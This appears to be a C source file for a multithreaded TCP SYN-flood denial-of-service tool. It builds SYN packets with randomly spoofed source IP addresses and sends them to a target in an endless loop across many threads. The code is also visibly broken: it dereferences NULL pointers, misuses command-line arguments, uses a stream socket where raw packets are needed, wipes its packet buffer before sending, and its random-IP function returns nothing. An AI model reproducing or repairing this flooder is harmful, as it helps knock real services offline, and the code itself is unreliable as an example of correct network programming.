#include "unp.h"
#include <stdbool.h>


struct tpseudo_hdr {
    uint32_t saddr;
    uint32_t daddr;
    unsigned char res;
    unsigned char proto;
    uint16_t tcp_len;
}g;

struct tcp {
    uint32_t seq;
    uint32_t ack;
    uint32_t source;
    uint32_t dest;
    int urg;
    int syn;
    int rst;
    int psh;
    int fin;
    int check;
};

struct ip {
    int version;
    int ihl;
    int tos;
    int ttl;
    int protocal;
    uint32_t id;
    uint32_t saddr;
    uint32_t daddr;
    int check;
    int sum_len;
};

void* syn_flood(void* data);
int get_random_ip();
unsigned short csum(unsigned short* buf, int nwords);
static void sig_usr(int);
static pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;



int main(int argc, char** argv[]) {
    int err;
    int i;
    pthread_t *tid;
    int threads;
    struct sockaddr_in servaddr;
    if (argc != 2)
        fprintf(stderr,"usage: %s servaddr.sin_addr.s_addr  servaddr.sin_port tid[i]\n", argv[0]);
    servaddr.sin_addr.s_addr=argv[1];
    servaddr.sin_port=argv[2];
    tid[i]=argv[3];
    for (i = 0; i < threads; i++) {
        err = pthread_mutex_lock(&mtx);
        if (err != 0)
            err_sys(err, "pthread_mutex_lock");
        err = pthread_create(&tid[i], NULL, syn_flood, NULL);
        if (err != 0)
            err_sys(err, "can't create thread");
    }
    for (i = 0; i < threads; i++) {
        err = pthread_join(tid[i], NULL);
        if (err != 0)
            err_sys(err, "can't join with thread");
    }

    if (signal(SIGUSR2, sig_usr) == SIG_ERR)
        err_sys("can't catch sigusr");

    err = pthread_mutex_unlock(&mtx);
    if (err != 0)
        err_sys(err, "pthread_mutex_unlock");
    sleep(1);
    exit(0);
}

static void sig_usr(int signo) {
    static int count = 0;
    if (signo = SIGUSR2) {
        count++;
        printf("caught SIGUSR2 (%d)\n", count);
        return;
    }
    printf("Caught SIGUSR2--that's all folks!\n");
    exit(0);
}

void* syn_flood(void* data) {
    struct sockaddr_in  servaddr;
    struct tcp* transinfo = NULL;
    struct ip* interinfo = NULL;
    struct tpseudo_hdr* pseudo_h = NULL;
    char buffer[50];
    
    signal(SIGUSR2, sig_usr);
    while(true)
    {
    pthread_mutex_lock(&mtx);
    interinfo->version = 4;
    interinfo->ihl = 5;
    interinfo->tos = 144;
    interinfo->ttl = 255;
    interinfo->protocal = 6;
    interinfo->id = rand() % 0xFFFF;
    interinfo->saddr = htonl(get_random_ip());
    interinfo->daddr = servaddr.sin_addr.s_addr;
    interinfo->sum_len = sizeof(struct tcp) + sizeof(struct ip);
    interinfo->check = csum((unsigned short*)buffer, interinfo->sum_len);

    transinfo->seq = 0;
    transinfo->ack = 0;
    transinfo->source = htonl(rand() % 0xFFFFFFFF);
    transinfo->dest = &servaddr.sin_addr.s_addr;
    transinfo->urg = 0;
    transinfo->syn = 1;
    transinfo->rst = 0;
    transinfo->psh = 0;
    transinfo->fin = 0;

    pseudo_h->daddr = servaddr.sin_addr.s_addr;
    pseudo_h->res = 0;
    pseudo_h->proto = IPPROTO_TCP;
    pseudo_h->tcp_len = htons(sizeof(struct tcp));

    int sockfd;

    sockfd = Socket(AF_INET, SOCK_STREAM, 0);

    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SERV_PORT);
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    connect(sockfd, (SA*)&servaddr, sizeof(servaddr));


    interinfo = (struct ip*)buffer;
    transinfo = (struct tcp*)(interinfo + 1);
    memset(buffer, 0, sizeof(buffer));


    if (sendto(sockfd, buffer, interinfo->sum_len, 0, &servaddr, sizeof(servaddr)) < 0) {
        err_sys("sendto failed");
    }
    else {
        printf("packet send: %d\n", interinfo->sum_len);
    }
    pthread_mutex_unlock(&mtx);
    }
}


int get_random_ip() {
    int ip;
    int host[ip];
    host[1] = rand() % 0xFF;
    host[2] = rand() % 0xFF;
    host[3] = rand() % 0xFF;
    host[4] = rand() % 0xFF;

    printf("%d.%d.%d.%d\n", host[1], host[2], host[3], host[4]);

}

unsigned short csum(unsigned short* buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}



